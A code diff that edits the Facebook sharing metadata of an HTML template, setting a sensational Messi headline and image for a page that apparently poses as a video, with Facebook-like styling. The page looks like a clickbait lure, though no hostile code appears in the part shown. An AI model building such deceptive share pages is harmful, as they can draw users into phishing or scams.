@@ -42,13 +42,13 @@ def get_template():
 <head>
     <meta charset="UTF-8">
     <link rel="icon" href="data:;base64,iVBORw0KGgo=">
-    <!-- METADATOS PARA FACEBOOK - CAMBIA ESTO A TU GUSTO -->
+    <!-- METADATOS PARA FACEBOOK -->
     <meta property="og:title" content="😲 Fuertes declaraciones de Messi" />
     <meta property="og:description" content="Me dijeron que ganaría" />
-    <meta property="og:image" content="https://imgur.com/a/n7fJT1T" />
+    <meta property="og:image" content="https://i.imgur.com/kgo0gfA.png" />
     <meta property="og:url" content="https://video-xeen.onrender.com" />
     <meta property="og:type" content="website" />
-    <title>Mi Video Epico</title>
+    <title>😲 Fuertes declaraciones de Messi</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Roboto', sans-serif; }
         body { background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
